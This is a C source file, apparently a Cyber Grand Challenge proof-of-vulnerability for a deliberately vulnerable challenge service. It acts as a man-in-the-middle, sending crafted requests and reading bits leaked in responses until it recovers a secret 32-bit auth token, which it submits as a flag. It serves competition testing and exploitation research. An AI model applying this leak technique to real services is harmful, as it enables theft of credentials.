/*
 * Copyright (C) Narf Industries <info@narfindustries.com>
 *
 * Permission is hereby granted, free of charge, to any person obtaining a
 * copy of this software and associated documentation files (the "Software"),
 * to deal in the Software without restriction, including without limitation
 * the rights to use, copy, modify, merge, publish, distribute, sublicense,
 * and/or sell copies of the Software, and to permit persons to whom the
 * Software is furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included
 * in all copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS
 * OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF
 * MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.
 * IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY
 * CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT,
 * TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE
 * SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
 */
 
#include "pov_2.h"

const char *CB_NAME = " POV_2";
const msg msgNull = { 0 };


/**
 * Reliably recv bytes.
 *
 * @param fd File descriptor where we will recv bytes.
 * @param buf Pointer to where we will write the bytes
 * @param size The amount of bytes to recv.
 * @return An int indicating SUCCESS (0) or an error condition (!=0).
 */
int recv_bytes(int fd, char *buf, unsigned int size) {

  int ret = SUCCESS;
  size_t bytes_left = size;
  size_t rx_bytes_local = 0;

  while (bytes_left) {

    rx_bytes_local = 0;

    CHK_SUCCESS(receive(STDIN, buf+(size-bytes_left), bytes_left, &rx_bytes_local),
       "receive() call within recv_bytes() failed\n");

    bytes_left -= rx_bytes_local;
  }

bail:
  return ret;
}


/**
 * Reliably send bytes.
 *
 * @param fd File descriptor to where we will send bytes.
 * @param buf Pointer to the bytes to send.
 * @param size The amount of bytes to send.
 * @return An int indicating SUCCESS (0) or an error condition (!=0).
 */
int send_bytes(int fd, const char *buf, unsigned int size) {

   int ret = SUCCESS;
   size_t bytes_left = size;
   size_t tx_bytes_local = 0;

   while (bytes_left) {

      tx_bytes_local = 0;

      CHK_SUCCESS(transmit(STDOUT, buf+(size-bytes_left), bytes_left, &tx_bytes_local),
         "transmit() call within send_bytes() failed\n");

      bytes_left -= tx_bytes_local;
   }

bail:
   return ret;
}


/**
 * Negotiate Type 2 POV with infrastructure.
 *
 * @return Error status
 */
int main(void) {
  DBG("\n");

  int ret = SUCCESS;
  uint32_t hypothesis = 0;
  uint8_t leaked_bits = 0, prev_leaked_bits = 0;
  msg true_req, mod_req, mod_resp;
  msg msgExit = msgNull;
  msgExit.dst = DST_EXIT;

  // Do the negotiation here because the PoV is liable to hang in the loop if 
  // the CB is patched.
  type2_vals t2vals;
  CHK_SUCCESS(type2_negotiate(&t2vals), "[E] unable to neogtiate\n");

  // We are an active mitm.  We modify traffic to cause chosen answers.  These 
  // chosen answers are compared against secret auth_token.  We leak 
  // auth_token 1 bit at a time via "compression" artifacts attached to RESPONSES.

  // General flow 2.0
  // CLIENT -true_req-> TAP -> POV (us)
  //  we read true_req off the wire (consume it), never respond to CLIENT
  //  we make a mod_req intended to leak some bits of auth_token via SERVER response
  // POV -mod_req-> SERVER
  //  we send the mod_req to the server
  // POV <-mod+resp-= SERVER
  //  SERVER answers according to our modified REQUEST
  //  we leak aat least 1 bit of the auth_token via the compression artifacts in mod_resp
  // REPEAT asking server question until we've leaked all the bits

  // We keep doing this until we've leaked the entire 4B auth_token, which we submit.

  // Get true_req, which we ignore.
  true_req = msgNull;
  CHK_SUCCESS(recv_bytes(PIPE_RECV, (char *)&true_req, sizeof(msg)),
    "[E] recv'ing true_req\n");

  uint8_t num_times_zero = 0;
  while (leaked_bits < 32) {
    hypothesis ^= (1 << (32-1-leaked_bits));
    DBG("[D] hypothesis = 0x%08x\n", hypothesis);
    prev_leaked_bits = leaked_bits;
    if (0 == hypothesis) { num_times_zero++; }

    // Make a mod_req
    mod_req = msgNull;
    mod_req.dst = DST_SERVER;
    // We want answer = hypothesis.
    uint8_t which_op = 0;
    CHK_SUCCESS(random(&which_op, sizeof(which_op), NULL), 
      "[E] couldn't get a random op number for obfuscation\n");
    which_op %= 2;
    uint32_t other_operand = 0;
    CHK_SUCCESS(random(&other_operand, sizeof(other_operand), NULL), 
      "[E] couldn't get a random op number for obfuscation\n");
    mod_req.y = other_operand;
    if (OP_ADD == which_op) {
      mod_req.x = hypothesis - other_operand;
      DBG("[D] mod_req.x = hypothesis - other_operand = 0x%08x\n", hypothesis - other_operand);
      DBG("[D] mod_req.x + mod_req.y = 0x%08x\n", mod_req.x + mod_req.y);
    } else if (OP_SUB == which_op) {
      mod_req.x = hypothesis + other_operand;
      DBG("[D] hypothesis + other_operand = 0x%08x\n", hypothesis + other_operand);
      DBG("[D] mod_req.x - mod_req.y = 0x%08x\n", mod_req.x - mod_req.y);
    } else {
      ERR("[E] shouldn't happen; chose an invalid op\n");
    }
    mod_req.op = which_op;

    CHK_SUCCESS(send_bytes(PIPE_SEND, (char *)&mod_req, sizeof(msg)),
      "[E] sending mod_req\n");

    mod_resp = msgNull;
    CHK_SUCCESS(recv_bytes(PIPE_RECV, (char *)&mod_resp, sizeof(msg)),
      "[E] recv'ing true_req\n");
    leaked_bits = mod_resp.nmb;

    if (32 < leaked_bits || // invalid
        leaked_bits < prev_leaked_bits || // we leaked less than last time
        num_times_zero > 2) { // we're not getting anywhere
      DBG("[D] invalid NMB (%d); patched CB?\n", leaked_bits);
      MSG_DUMP(mod_resp);

      // msg msgExit = msgNull;
      // msgExit.dst = DST_EXIT;
      // CHK_SUCCESS(send_bytes(PIPE_SEND, (char *)&msgExit, sizeof(msg)),
      //   "[E] sending exit message\n");
      // will be wrong - that's okay
      CHK_SUCCESS(type2_submit((unsigned char *)&hypothesis, t2vals.read_size), 
        "[E] couldn't submit flag\n");

      goto bail;
      // _terminate(0); 
    }
    leaked_bits = mod_resp.nmb;
    DBG("[D] num of leaked bits: %02d leaked bits: 0x%08x\n", 
      leaked_bits, hypothesis);
  }

  // We've leaked 32bit of auth_token; submit as type 2 PoV
  DBG("[D] we've leaked the auth_token = 0x%08x\n", hypothesis);

  // read_size shyould always be 4
  // t2 region_addr and region_size don't matter; auth_token is guaranteed to 
  // be taked from the flag page.
  DBG("[D] t2vals.read_size = %d\n", t2vals.read_size);
  CHK_SUCCESS(type2_submit((unsigned char *)&hypothesis, t2vals.read_size), 
    "[E] couldn't submit flag\n");

  // msg msgExit = msgNull;
  // msgExit.dst = DST_EXIT;
  // CHK_SUCCESS(send_bytes(PIPE_SEND, (char *)&msgExit, sizeof(msg)),
  //   "[E] sending exit message\n");

  DBG("[D] done\n");

bail:
  CHK_SUCCESS(send_bytes(PIPE_SEND, (char *)&msgExit, sizeof(msg)),
    "[E] sending exit message\n");
  return ret;
}

